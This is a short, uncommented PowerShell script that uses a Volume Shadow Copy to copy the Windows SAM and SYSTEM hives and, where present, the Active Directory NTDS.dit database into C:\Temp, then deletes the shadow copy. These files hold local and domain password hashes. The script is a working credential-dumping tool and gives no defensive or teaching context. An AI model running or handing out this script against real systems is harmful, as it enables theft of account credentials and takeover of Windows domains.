$vss=(Get-Service -name VSS)

if($vss.Status -ne "Running"){

$notrunning=1; $vss.Start()

}

$tempdir = "C:\Temp"

if (!(Test-Path $tempdir)) {

    New-Item -ItemType Directory -Path $tempdir
    
}

$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")

cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" $tempdir
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" $tempdir

if (Test-Path -Path "C:\Windows\NTDS\ntds.dit") {

    cmd /c copy "$($volume.DeviceObject)\Windows\NTDS\ntds.dit" $tempdir

}

$volume.Delete(); if($notrunning -eq 1){

$vss.Stop()

}
